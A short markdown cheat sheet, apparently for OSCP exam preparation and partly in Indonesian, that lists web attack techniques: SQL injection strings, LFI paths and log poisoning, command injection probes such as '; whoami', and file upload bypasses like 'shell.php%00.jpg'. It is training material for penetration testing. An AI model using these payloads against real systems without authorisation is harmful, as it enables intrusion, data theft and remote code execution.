---
name: "Web Application Attacks — SQLi, LFI, CMDi & File Upload"
description: "Comprehensive web application attack methodology for OSCP covering SQL injection (manual, no sqlmap), LFI to RCE via log poisoning, command injection detection, file upload bypass techniques, and structured attack roadmap."
tags: [web, sqli, lfi, command-injection, file-upload, webshell]
---

# Web Application Attacks

## Attack Roadmap

```
Target URL
  ├── RECON: whatweb → headers → tech stack
  ├── ENUMERATE: ffuf/feroxbuster → dirs → files → params
  │     ├── JS files → endpoints → secrets
  │     ├── robots.txt → hidden paths
  │     └── Source code → comments → credentials
  ├── ATTACK SURFACE:
  │     ├── SQLi: ' OR 1=1 → UNION → data extraction
  │     ├── SSTI: {{7*7}} → RCE
  │     ├── XSS: <script> → stored/reflected/DOM
  │     ├── CMDi: ; whoami → reverse shell
  │     ├── LFI: ../../etc/passwd → log poisoning → RCE
  │     └── XXE: file read / SSRF
  └── POST-EXPLOIT: extract creds from DB → config files → pivot
```

## LFI to RCE

1. Buktikan file read: `../../etc/passwd`
2. Log poisoning: inject PHP code di User-Agent → include access.log
3. PHP wrappers: `php://filter/convert.base64-encode/resource=config.php`
4. Proc enumeration: `/proc/self/environ`, `/proc/PID/cmdline`

## SQL Injection (Manual — no sqlmap)

1. Deteksi: `' OR 1=1--`, `' AND SLEEP(5)--`
2. UNION-based: tentukan jumlah columns, extract data
3. Blind SQLi: time-based, boolean-based
4. File read/write (MySQL): `LOAD_FILE()`, `INTO OUTFILE`
5. MSSQL: `xp_cmdshell` untuk RCE

## Command Injection

- Detection: `; whoami`, `| whoami`, `$(whoami)`, `` `whoami` ``
- Blind: `; sleep 5`, `| ping -c 10 $IP`
- Exploitation: reverse shell, webshell write

## File Upload Bypass

- Extension bypass: `.php5`, `.phtml`, `.php.jpg`
- MIME bypass: Content-Type manipulation
- Double extension: `shell.php.jpg`
- Null byte: `shell.php%00.jpg`
- .htaccess override: `AddType application/x-httpd-php .txt`

## Best Practices

- Manual SQLi adalah keharusan — sqlmap dilarang
- LFI sering jadi entry vector paling cepat
- Setiap parameter adalah potensi CMDi/SSTI
- Simpan semua payload yang berhasil untuk reuse
